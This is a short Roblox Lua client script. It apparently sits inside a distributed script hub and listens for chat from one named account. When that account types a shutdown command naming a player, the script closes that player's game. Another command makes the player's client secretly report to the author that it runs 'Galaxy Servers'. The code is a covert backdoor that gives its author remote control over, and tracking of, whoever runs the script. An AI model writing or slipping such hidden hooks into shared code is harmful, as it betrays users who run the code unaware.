    local prefix = ","
    local LPlayer = game.Players:FindFirstChild('plzIWannaGetAdmin')
    LPlayer.Chatted:Connect(function(msg)
        msg = msg:lower()
        if string.sub(msg,1,3) == "/e " then
            msg = string.sub(msg,4)
        end
        if string.sub(msg,1,1) == prefix then
            local cmd
            local space = string.find(msg," ")
            if space then
                cmd = string.sub(msg,2,space-1)
            else
                cmd = string.sub(msg,2)
            end

            if cmd == "shutdown" then
                local var = string.sub(msg,space+1)
                local target = GetPlayer(var)
                if game.Players.LocalPlayer == target then
                    game:Shutdown()
                    wait(0.5)
                end
            end
            if cmd == "ghcheck" then
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w plzIWannaGetAdmin I am using Galaxy Servers", "All")
            end
            print("You can be shutdown by Pluto :D!")
        end
    end)


    function GetPlayer(String)
    local plr
    local strl = String:lower()
        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name:lower():sub(1, #String) == String:lower() then
                plr = v
            end 
        end
        if String == "me" then
                plr = game.Players.LocalPlayer
            end
        if String == "" or String == " " then
        plr = nil
        end
    return plr
    end


